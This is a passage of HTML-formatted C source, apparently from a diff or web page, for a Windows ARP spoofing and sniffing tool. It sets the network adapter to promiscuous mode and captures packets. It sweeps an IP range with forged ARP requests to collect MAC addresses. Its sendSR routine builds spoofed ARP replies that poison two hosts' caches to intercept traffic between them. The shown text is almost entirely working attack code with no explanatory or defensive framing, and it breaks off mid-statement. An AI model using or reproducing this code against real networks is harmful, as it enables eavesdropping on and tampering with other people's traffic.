+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(mmac,eth-&gt;eh_src,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!mm)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\t");&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(k=0;k&lt;5;k++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%.2x-",eth-&gt;eh_src[k]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%.2x\n",eth-&gt;eh_src[5]);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch(op)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case 
+      1:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n[MAC 
+      LIST:]");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;case 
+      2:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n[Sniffing 
+      Host:]");&nbsp;&nbsp;&nbsp;&nbsp; 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mm=TRUE;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;if((op==1) || 
+      (op==2))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n[IP:] 
+      %.16s&nbsp;&nbsp;[MAC:] 
+      ",inet_ntoa(sin.sin_addr));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(k=0;k&lt;5;k++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%.2x-",eth-&gt;eh_src[k]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%.2x",eth-&gt;eh_src[5]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;else if(((op==3) || (op==4)) &amp;&amp; (!fm || 
+      !sm))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(arp-&gt;arp_spa==htonl(firstip))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(fmac,eth-&gt;eh_src,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fm=TRUE;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(arp-&gt;arp_spa==htonl(secondip))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(smac,eth-&gt;eh_src,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sm=TRUE;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;return 
+      ;<BR>}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>DWORD 
+      WINAPI sniff(LPVOID 
+      no)<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;option=*(int 
+      *)no;<BR>&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp; 
+      recvbuf[1024*250];<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(PacketSetHwFilter(lpadapter,NDIS_PACKET_TYPE_PROMISCUOUS)==FALSE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Warning: 
+      Unable to set the adapter to promiscuous 
+      mode\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(PacketSetBuff(lpadapter,500*1024)==FALSE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("PacketSetBuff 
+      Error: 
+      %d\n",GetLastError());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(PacketSetReadTimeout(lpadapter,1)==FALSE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Warning: 
+      Unable to set the 
+      timeout\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if((lppacketr=PacketAllocatePacket())==FALSE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("PacketAllocatePacket 
+      receive Error: 
+      %d\n",GetLastError());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;PacketInitPacket(lppacketr,(char 
+      *)recvbuf,sizeof(recvbuf));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;while(!kbhit())<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(PacketReceivePacket(lpadapter,lppacketr,TRUE)==FALSE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(GetLastError()==6)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("PacketReceivePacket 
+      Error: 
+      %d\n",GetLastError());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;getdata(lppacketr,option);<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;return 
+      0;<BR>}<BR><BR>DWORD WINAPI sendMASR(LPVOID 
+      no)<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;fun=*(int 
+      *)no;<BR>&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;k,stimes;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp; 
+      sendbuf[1024];<BR>&nbsp;&nbsp;&nbsp;&nbsp;ETHDR&nbsp;&nbsp;eth;<BR>&nbsp;&nbsp;&nbsp;&nbsp;ARPHDR 
+      arp;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(fun&lt;1 || 
+      fun&gt;4)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(k=0;k&lt;6;k++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eth.eh_dst[k]=0xff;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_tha[k]=0x00;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fun==2)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eth.eh_dst[5]=0xfe;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;memcpy(eth.eh_src,mmac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;eth.eh_type=htons(ETH_ARP);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_hdr=htons(ARP_HARDWARE);<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_pro=htons(ETH_IP);<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_hln=6;<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_pln=4;<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_opt=htons(ARP_REQUEST);<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_spa=htonl(myip);<BR>&nbsp;&nbsp;&nbsp;&nbsp;memcpy(arp.arp_sha,mmac,6);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(fun==1 
+      || 
+      fun==2)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stimes=1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;else 
+      if(fun==3 || 
+      fun==4)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stimes=2;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;for(k=0;k&lt;stimes;k++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(stimes==1)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_tpa=htonl(firstip+(num++));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else 
+      if(stimes==2)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch(k)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case 
+      0:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_tpa=htonl(firstip);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case 
+      1:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_tpa=htonl(secondip);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset(sendbuf,0,sizeof(sendbuf));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(sendbuf,&amp;eth;,sizeof(eth));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(sendbuf+sizeof(eth),&amp;arp,sizeof(arp));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketInitPacket(lppackets,sendbuf,sizeof(eth)+sizeof(arp));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(PacketSendPacket(lpadapter,lppackets,TRUE)==FALSE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("PacketSendPacket 
+      in sendMASR Error: 
+      %d\n",GetLastError());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;return 
+      0;<BR>}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>DWORD 
+      WINAPI sendSR(LPVOID 
+      no)<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp; fun=*(int 
+      *)no;<BR>&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp; 
+      j,k;<BR>&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp;sendbuf[1024];<BR>&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;&nbsp;sockaddr_in&nbsp;&nbsp;fsin,ssin;<BR>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;&nbsp;&nbsp;&nbsp;stimes=FALSE;<BR>&nbsp;&nbsp;&nbsp;&nbsp;ETHDR&nbsp;&nbsp; 
+      eth;<BR>&nbsp;&nbsp;&nbsp;&nbsp;ARPHDR&nbsp;&nbsp;arp;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;fsin.sin_addr.s_addr=htonl(firstip);<BR>&nbsp;&nbsp;&nbsp;&nbsp;ssin.sin_addr.s_addr=htonl(secondip);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;eth.eh_type=htons(ETH_ARP);<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_hdr=htons(ARP_HARDWARE);<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_pro=htons(ETH_IP);<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_hln=6;<BR>&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_pln=4;<BR>&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;arp.arp_opt=htons(ARP_REPLY);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      <BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(fun==3)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(mm)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if((firstip==myip) 
+      &amp;&amp; 
+      (secondip==myip))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fm=TRUE;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;sm=TRUE;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(fmac,mmac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(smac,mmac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else 
+      if(!fm || 
+      !sm)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\nNot 
+      get enough data\n"); 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(j=0;j&lt;2;j++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(j==0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\nSpoofing 
+      %.16s 
+      :&nbsp;&nbsp;",inet_ntoa(fsin.sin_addr));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%.16s 
+      ==&gt; 
+      ",inet_ntoa(ssin.sin_addr));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else 
+      if(j==1)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Spoofing 
+      %.16s 
+      :&nbsp;&nbsp;",inet_ntoa(ssin.sin_addr));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%.16s 
+      ==&gt; 
